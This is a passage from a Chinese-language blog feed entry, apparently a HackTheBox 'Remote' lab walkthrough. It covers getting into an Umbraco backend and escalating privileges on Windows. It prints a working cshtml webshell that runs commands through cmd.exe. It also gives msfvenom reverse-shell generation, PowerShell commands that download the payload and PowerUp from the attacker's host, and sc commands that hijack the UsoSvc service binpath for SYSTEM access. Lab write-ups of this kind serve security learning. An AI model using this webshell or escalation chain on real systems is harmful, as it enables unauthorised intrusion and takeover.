href="http://10.10.10.180/umbraco/处登录到后台。翻看下功能，发现个创建cshtml模板的地方，遂上个cshtml的webshell。" target="_blank" rel="noopener">http://10.10.10.180/umbraco/处登录到后台。翻看下功能，发现个创建cshtml模板的地方，遂上个cshtml的webshell。</a></p><figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">@<span class="hljs-keyword">using</span> System.Diagnostics;</span><br><span class="line">@<span class="hljs-keyword">using</span> System.IO;</span><br><span class="line">@functions &#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">string</span> <span class="hljs-title">ExecuteCommand</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> command</span>)</span></span><br><span class="line"><span class="hljs-function"></span>    &#123;</span><br><span class="line">        <span class="hljs-keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            ProcessStartInfo processStartInfo = <span class="hljs-keyword">new</span> ProcessStartInfo();</span><br><span class="line">            processStartInfo.FileName = <span class="hljs-string">"cmd.exe"</span>;</span><br><span class="line">            processStartInfo.Arguments = <span class="hljs-string">"/c "</span> + command;</span><br><span class="line">            processStartInfo.RedirectStandardOutput = <span class="hljs-literal">true</span>;</span><br><span class="line">            processStartInfo.UseShellExecute = <span class="hljs-literal">false</span>;</span><br><span class="line">            Process process = Process.Start(processStartInfo);</span><br><span class="line">            <span class="hljs-keyword">using</span> (StreamReader streamReader = process.StandardOutput)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="hljs-keyword">string</span> ret = streamReader.ReadToEnd();</span><br><span class="line">                <span class="hljs-keyword">return</span> ret;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> ex.ToString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (Request.QueryString[<span class="hljs-string">"p1ay2win"</span>] != <span class="hljs-literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        @ExecuteCommand(Request.QueryString[<span class="hljs-string">"p1ay2win"</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-07 103333.png" style="width:100%;"></p><p>获得第一个flag。</p><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-07 102838.png" style="width:100%;"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用msfvemon生产一个meterpreter的反弹shell，在本机上起一个http服务，通过powershell上传反弹shell和PowerUp提权检测脚本。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_http lhost=10.10.x.x lport=9001 -f exe -o re.exe</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">powershell (new-object System.Net.WebClient).DownloadFile( &apos;http://10.10.X.X:8000/re.exe&apos;,&apos;c:\inetpub\wwwroot\views\re.exe&apos;)</span><br><span class="line">powershell (new-object System.Net.WebClient).DownloadFile( &apos;http://10.10.X.X:8000/PowerUp.ps1&apos;,&apos;c:\inetpub\wwwroot\views\PowerUp.ps1&apos;)</span><br></pre></td></tr></table></figure><p>在靶机运行反弹shell，用反弹shell的session开启一个交互的shell，运行PowerUp的invoke-allchecks功能，发现可修改UsoSvc的binpath提权。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;import-module c:\inetpub\wwwroot\views\PowerUp.ps1;invoke-allchecks&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-07 112948.png" style="width:100%;"></p><p>修改UsoSvc的binpath，在重新启动这个程序的时候就能执行binpath的命令。</p><figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc config UsoSvc binpath="c:\inetpub\wwwroot\views\re.exe"</span><br><span class="line">sc stop UscSvc</span><br><span class="line">sc <span class="hljs-built_in">start</span> UscSvc</span><br></pre></td></tr></table></figure><p>当时提权的时候发现个问题，binpath的命令运行一段时间就会被kill掉，找了下命令用<code>cmd /c</code>开头就在不被kill。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config UsoSvc binpath=<span class="hljs-string">"cmd /c c:\inetpub\wwwroot\views\re.exe"</span></span><br></pre></td></tr></table></figure><p>改了binpath后，start这个usosvc服务会出现failed字样，这是正常现象，命令还是会被运行。</p><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-07 140128.png" style="width:100%;"></p><p>最后，会得到一个system权限的session。没图…复现时候试了几天又reset死活登录不上…</p><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-09 223656.png" style="width:100%;"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>hackthebox有不用下载和有windows靶机的好处，但是就是速度慢、环境经常有问题，难搞哦。</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;…&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="靶机" scheme="https://blog.play2win.top/categories/靶机/"/>
-    
-    
-    <category term="hackthebox" scheme="https://blog.play2win.top/tags/hackthebox/"/>
+    <category term="SSTI" scheme="http://127.0.0.1/tags/SSTI/"/>
     
   </entry>
   
